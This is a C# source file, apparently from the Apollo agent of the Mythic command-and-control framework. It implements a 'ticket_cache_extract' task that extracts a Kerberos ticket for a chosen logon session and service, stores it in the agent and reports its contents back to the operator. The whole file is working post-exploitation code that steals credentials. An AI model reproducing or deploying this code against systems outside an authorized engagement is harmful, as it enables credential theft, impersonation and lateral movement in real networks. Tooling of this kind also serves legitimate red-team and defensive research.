#define COMMAND_NAME_UPPER

#if DEBUG
#define TICKET_CACHE_EXTRACT
#endif

#if TICKET_CACHE_EXTRACT

using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using ApolloInterop.Classes;
using ApolloInterop.Features.KerberosTickets;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Utils;

namespace Tasks;

public class ticket_cache_extract : Tasking
{
    [DataContract]
    internal struct TicketExtractParameters
    {
        [DataMember(Name = "luid")]
        internal string? luid;
        [DataMember(Name = "service")]
        internal string service;
    }

    public ticket_cache_extract(IAgent agent, MythicTask data) : base(agent, data)
    { }
    
    
    public override void Start()
    {
        MythicTaskResponse resp = new MythicTaskResponse { };
        TicketExtractParameters parameters = _jsonSerializer.Deserialize<TicketExtractParameters>(_data.Parameters);
        string luid = parameters.luid ?? "";
        string service = parameters.service;
        try
        {
            var ticket = _agent.GetTicketManager().ExtractTicketFromCache(luid, service);
            _agent.GetTicketManager().AddTicketToTicketStore(new(ticket));
            resp = CreateTaskResponse($"Extracted Ticket for service {service}: \n {KerberosTicketDataDTO.CreateFromKerberosTicket(ticket,luid).ToString().ToIndentedString()}", true);
        }
        catch (Exception e)
        {
            resp = CreateTaskResponse($"Failed to enumerate tickets: {e.Message}", true, "error");
        }
        //get and send back any artifacts
        IEnumerable<Artifact> artifacts = _agent.GetTicketManager().GetArtifacts();
        var artifactResp = CreateArtifactTaskResponse(artifacts);
        _agent.GetTaskManager().AddTaskResponseToQueue(artifactResp);
        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
    }
}

#endif